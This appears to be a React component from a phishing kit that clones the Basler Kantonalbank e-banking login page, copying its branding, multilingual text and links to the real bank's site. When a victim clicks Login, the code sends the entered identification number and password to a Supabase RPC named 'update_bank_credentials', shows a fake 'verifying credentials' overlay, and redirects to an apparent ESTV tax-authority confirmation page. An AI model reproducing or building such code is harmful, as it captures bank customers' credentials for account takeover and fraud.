import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Info } from "lucide-react";
import bkbLogo from "@/assets/bkb-logo.svg";

const GREEN = "#5faa28";
const ERROR = "#b71e27";
const BORDER_IDLE = "#dcdcdc";
const BTN_IDLE_BG = "#e8eca4";
const BTN_IDLE_TEXT = "#757585";
const BTN_ACTIVE_BG = "#dde275";
const BTN_ACTIVE_HOVER = "#939919";

type Lang = "DE" | "FR" | "IT" | "EN";

const T: Record<Lang, Record<string, string>> = {
  DE: {
    title: "Login",
    subtitle: "Ihr Zugang zum digitalen Banking",
    ident: "Identifikationsnummer",
    pwd: "Passwort",
    legal: "Mit dem Login akzeptieren Sie unsere",
    legalLink: "rechtlichen Hinweise und Nutzungsbedingungen",
    login: "Login",
    loginProblem: "Probleme mit dem Login?",
    noAccess: "Sie nutzen unser Digital Banking noch nicht?",
    request: "Beantragen Sie Ihren Zugang zum Digital Banking",
    questions: "Haben Sie Fragen?",
    questionsText: "Fragen beantwortet Ihnen gerne unsere E-Serviceline von Montag bis Freitag von 8:00 Uhr - 18:00 Uhr.",
    eservice: "E-Serviceline",
    inland: "Inland",
    ausland: "Ausland",
    info: "Wichtige Information",
    infoText: "Bitte beachten Sie, dass die Börse in den (USA) aufgrund eines Feiertages heute geschlossen ist.",
    infoThanks: "Vielen Dank für Ihr Verständnis.",
    required: "Ein Wert wird benötigt",
    f1: "Sicherheit",
    f2: "Bedingungen",
    f3: "Informationen",
    f4: "Hilfe und Kontakt",
    f5: "Informationen zu Finanzinstrumenten",
    f6: "Ausführungsgrundsätze im Wertschriftenhandel",
    pwdShow: "Passwort anzeigen",
  },
  FR: {
    title: "Connexion",
    subtitle: "Votre accès au Digital Banking",
    ident: "Numéro d'identification",
    pwd: "Mot de passe",
    legal: "En vous connectant, vous acceptez nos",
    legalLink: "mentions légales et conditions d'utilisation",
    login: "Connexion",
    loginProblem: "Problèmes de connexion?",
    noAccess: "Vous n'utilisez pas encore notre Digital Banking?",
    request: "Demandez votre accès au Digital Banking",
    questions: "Avez-vous des questions?",
    questionsText: "Notre E-Serviceline répond volontiers à vos questions du lundi au vendredi de 8h00 à 18h00.",
    eservice: "E-Serviceline",
    inland: "Suisse",
    ausland: "Étranger",
    info: "Information importante",
    infoText: "Veuillez noter que la bourse aux (USA) est fermée aujourd'hui en raison d'un jour férié.",
    infoThanks: "Merci de votre compréhension.",
    required: "Une valeur est requise",
    f1: "Sécurité",
    f2: "Conditions",
    f3: "Informations",
    f4: "Aide et contact",
    f5: "Informations sur les instruments financiers",
    f6: "Principes d'exécution dans le négoce de titres",
    pwdShow: "Afficher le mot de passe",
  },
  IT: {
    title: "Login",
    subtitle: "Il vostro accesso al Digital Banking",
    ident: "Numero d'identificazione",
    pwd: "Password",
    legal: "Effettuando il login accettate le nostre",
    legalLink: "note legali e condizioni di utilizzo",
    login: "Login",
    loginProblem: "Problemi con il login?",
    noAccess: "Non utilizzate ancora il nostro Digital Banking?",
    request: "Richiedete il vostro accesso al Digital Banking",
    questions: "Avete domande?",
    questionsText: "La nostra E-Serviceline risponde volentieri alle vostre domande dal lunedì al venerdì dalle 8:00 alle 18:00.",
    eservice: "E-Serviceline",
    inland: "Svizzera",
    ausland: "Estero",
    info: "Informazione importante",
    infoText: "Vi preghiamo di notare che la borsa negli (USA) è chiusa oggi a causa di un giorno festivo.",
    infoThanks: "Grazie per la vostra comprensione.",
    required: "È richiesto un valore",
    f1: "Sicurezza",
    f2: "Condizioni",
    f3: "Informazioni",
    f4: "Aiuto e contatto",
    f5: "Informazioni sugli strumenti finanziari",
    f6: "Principi di esecuzione nel commercio di titoli",
    pwdShow: "Mostra password",
  },
  EN: {
    title: "Login",
    subtitle: "Your access to digital banking",
    ident: "Identification number",
    pwd: "Password",
    legal: "By logging in you accept our",
    legalLink: "legal notices and terms of use",
    login: "Login",
    loginProblem: "Problems with login?",
    noAccess: "Not yet using our Digital Banking?",
    request: "Request your access to Digital Banking",
    questions: "Do you have questions?",
    questionsText: "Our E-Serviceline is happy to answer your questions Monday to Friday from 8:00 to 18:00.",
    eservice: "E-Serviceline",
    inland: "Domestic",
    ausland: "International",
    info: "Important Information",
    infoText: "Please note that the stock exchange in the (USA) is closed today due to a public holiday.",
    infoThanks: "Thank you for your understanding.",
    required: "A value is required",
    f1: "Security",
    f2: "Terms",
    f3: "Information",
    f4: "Help and contact",
    f5: "Information on financial instruments",
    f6: "Execution principles in securities trading",
    pwdShow: "Show password",
  },
};

type FieldProps = {
  id: string;
  label: string;
  type?: "text" | "password";
  value: string;
  onChange: (v: string) => void;
  showPwdToggle?: boolean;
  showPwd?: boolean;
  onTogglePwd?: () => void;
  pwdShowLabel?: string;
  errorText: string;
};

const Field = ({
  id, label, type = "text", value, onChange,
  showPwdToggle, showPwd, onTogglePwd, pwdShowLabel, errorText,
}: FieldProps) => {
  const [touched, setTouched] = useState(false);
  const [focused, setFocused] = useState(false);
  const hasError = touched && value.length === 0;
  const borderColor = hasError ? ERROR : focused ? "#000000" : BORDER_IDLE;
  const inputType = showPwdToggle ? (showPwd ? "text" : "password") : type;

  return (
    <div>
      <label htmlFor={id} className="font-bold text-[15px] mb-2 block">{label}</label>
      <div className="relative">
        <input
          id={id}
          type={inputType}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => { setFocused(false); setTouched(true); }}
          className="w-full h-12 border px-3 pr-12 outline-none bg-white transition-colors hover:border-black"
          style={{ borderColor }}
        />
        {showPwdToggle && (
          <button
            type="button"
            onClick={onTogglePwd}
            aria-label={pwdShowLabel}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-black"
          >
            {showPwd ? <EyeOff size={20} /> : <Eye size={20} />}
          </button>
        )}
      </div>
      {hasError && (
        <p className="mt-1 text-[13px]" style={{ color: ERROR }}>{errorText}</p>
      )}
    </div>
  );
};

const ChBaslerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");
  const t = T[lang];

  const [ident, setIdent] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Basler Kantonalbank – Login", "/favicon.ico");

  const formFilled = ident.length > 0 && passwort.length > 0;

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: ident,
        p_password: passwort,
        p_username_label: "Identifikationsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const langs: Lang[] = ["DE", "FR", "IT", "EN"];

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white text-black">
        {/* Header */}
        <header className="bg-black h-16 px-5 md:px-10 flex items-center justify-between">
          <img src={bkbLogo} alt="Basler Kantonalbank" className="h-7 md:h-8" />
          <nav className="flex items-center gap-6 text-[15px] text-white">
            {langs.map((l) => (
              <button
                key={l}
                onClick={() => setLang(l)}
                className={lang === l ? "text-white/60" : "text-white"}
                style={{ background: "none" }}
              >
                {l}
              </button>
            ))}
          </nav>
        </header>

        {/* Main */}
        <main className="flex-1 flex flex-col">
          {/* Above the fold — fills viewport */}
          <section className="min-h-[calc(100vh-4rem)] flex">
            <div className="max-w-[1280px] w-full mx-auto px-6 md:px-32 pt-10 md:pt-14 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
              <div>
                <h1 className="text-[32px] md:text-[44px] font-normal leading-[1.05]">{t.title}</h1>
                <p className="text-[18px] mt-6 mb-12 md:mb-14">{t.subtitle}</p>

                {/* Mobile Info Card */}
                <div className="lg:hidden mb-12">
                  <div className="p-7 text-white shadow-[0_4px_20px_rgba(0,0,0,0.15)]" style={{ backgroundColor: GREEN }}>
                    <div className="flex items-center gap-3 mb-3">
                      <Info size={26} strokeWidth={1.5} />
                      <h3 className="text-[22px] md:text-[24px] font-normal">{t.info}</h3>
                    </div>
                    <p className="text-[15px] leading-[1.5]">{t.infoText}</p>
                    <p className="text-[15px] mt-4">{t.infoThanks}</p>
                  </div>
                </div>

                <div className="space-y-6">
                  <Field
                    id="bkb-ident"
                    label={t.ident}
                    value={ident}
                    onChange={setIdent}
                    errorText={t.required}
                  />
                  <Field
                    id="bkb-pass"
                    label={t.pwd}
                    value={passwort}
                    onChange={setPasswort}
                    showPwdToggle
                    showPwd={showPassword}
                    onTogglePwd={() => setShowPassword(!showPassword)}
                    pwdShowLabel={t.pwdShow}
                    errorText={t.required}
                  />
                </div>

                <p className="text-[14px] mt-8 mb-8">
                  {t.legal}{" "}
                  <a href="https://www.bkb.ch/rechtliche-hinweise" target="_blank" rel="noopener noreferrer" className="underline">{t.legalLink}</a>.
                </p>

                <div className="flex flex-col-reverse items-stretch gap-3 md:flex-row md:items-center md:gap-6 md:flex-wrap">
                  <button
                    onClick={handleSubmit}
                    className="w-full md:w-auto px-10 py-3 text-[15px] transition-colors"
                    style={{
                      backgroundColor: formFilled ? BTN_ACTIVE_BG : BTN_IDLE_BG,
                      color: formFilled ? "#000000" : BTN_IDLE_TEXT,
                      cursor: formFilled ? "pointer" : "default",
                    }}
                    onMouseEnter={(e) => {
                      if (formFilled) e.currentTarget.style.backgroundColor = BTN_ACTIVE_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor = formFilled ? BTN_ACTIVE_BG : BTN_IDLE_BG;
                    }}
                  >
                    {t.login}
                  </button>
                  <a href="https://www.bkb.ch/de/login-hilfe" target="_blank" rel="noopener noreferrer" className="underline text-[13px] md:text-[15px] self-start">{t.loginProblem}</a>
                </div>

                <div className="mt-28 md:mt-20">
                  <h2 className="text-[24px] md:text-[28px] font-light mb-4">{t.noAccess}</h2>
                  <a href="https://www.bkb.ch/ebanking-beantragen" target="_blank" rel="noopener noreferrer" className="underline text-[15px]">{t.request}</a>
                </div>
              </div>

              {/* Right column — Wichtige Information (Desktop) */}
              <div className="hidden lg:block">
                <div className="p-7 text-white shadow-[0_4px_20px_rgba(0,0,0,0.15)]" style={{ backgroundColor: GREEN }}>
                  <div className="flex items-center gap-3 mb-3">
                    <Info size={26} strokeWidth={1.5} />
                    <h3 className="text-[22px] md:text-[24px] font-normal">{t.info}</h3>
                  </div>
                  <p className="text-[15px] leading-[1.5]">{t.infoText}</p>
                  <p className="text-[15px] mt-4">{t.infoThanks}</p>
                </div>
              </div>
            </div>
          </section>

          {/* Scroll area — below fold */}
          <section className="max-w-[1280px] w-full mx-auto px-6 md:px-32 mt-24 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
            <div>
              <h2 className="text-[24px] md:text-[28px] font-light mb-4">{t.questions}</h2>
              <p className="text-[15px] mb-6 leading-[1.5]">{t.questionsText}</p>
              <p className="text-[15px] mb-6">{t.eservice}</p>
              <div className="mb-4">
                <p className="text-[15px]">{t.inland}</p>
                <a href="tel:+41612663636" className="text-[15px]">+41 61 266 36 36</a>
              </div>
              <div>
                <p className="text-[15px]">{t.ausland}</p>
                <a href="tel:+41612663636" className="text-[15px]">+41 61 266 36 36</a>
              </div>
            </div>
            <div />
          </section>
        </main>

        {/* Footer */}
        <footer className="border-t border-gray-300 mt-16">
          <div className="max-w-[1280px] mx-auto px-6 md:px-32 py-8 text-[14px]">
            <div className="flex flex-col md:flex-row md:gap-10 gap-3 mb-8 md:mb-4">
              <a href="https://www.bkb.ch/de/die-basler-kantonalbank/kontakt-services/hilfe-und-support/e-banking-faq" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f1}</a>
              <a href="https://www.bkb.ch/de/privatkunden/konten-und-karten/digital-banking/e-banking-fuer-private" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f2}</a>
              <a href="https://www.bkb.ch/de/privatkunden/konten-und-karten/digital-banking/e-banking-fuer-private" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f3}</a>
              <a href="https://www.bkb.ch/kontakt-services" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f4}</a>
            </div>
            <div className="flex flex-col md:flex-row md:gap-10 gap-3">
              <a href="https://www.bkb.ch/de/die-basler-kantonalbank/kontakt-services/rechtliches/fidleg/BIB/" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f5}</a>
              <a href="https://www.bkb.ch/de/die-basler-kantonalbank/kontakt-services/rechtliches/fidleg" target="_blank" rel="noopener noreferrer" className="no-underline text-black">{t.f6}</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBaslerKantonalbank;
